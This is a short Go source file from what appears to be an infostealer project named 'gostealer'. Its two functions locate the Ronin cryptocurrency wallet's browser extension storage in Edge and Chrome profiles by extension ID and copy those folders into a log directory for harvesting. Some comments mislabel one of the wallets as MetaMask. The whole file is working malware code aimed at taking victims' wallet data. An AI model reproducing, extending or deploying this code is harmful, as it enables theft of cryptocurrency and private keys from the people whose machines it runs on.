package wallets

import (
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyRoninEdge(browserPath, logFolderPath string) {
	//metamask edge version
	ronine := path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")

	utils.CopyFolderFiles(ronine, path.Join(logFolderPath, "wallets", "ronin_edge"))

	//metamask chrome version
	roninc := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	utils.CopyFolderFiles(roninc, path.Join(logFolderPath, "wallets", "ronin_edge_chromeversion"))
}

func CopyRoninChrome(browserPath, logFolderPath string) {
	ronin := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	utils.CopyFolderFiles(ronin, path.Join(logFolderPath, "wallets", "ronin_chrome"))
}
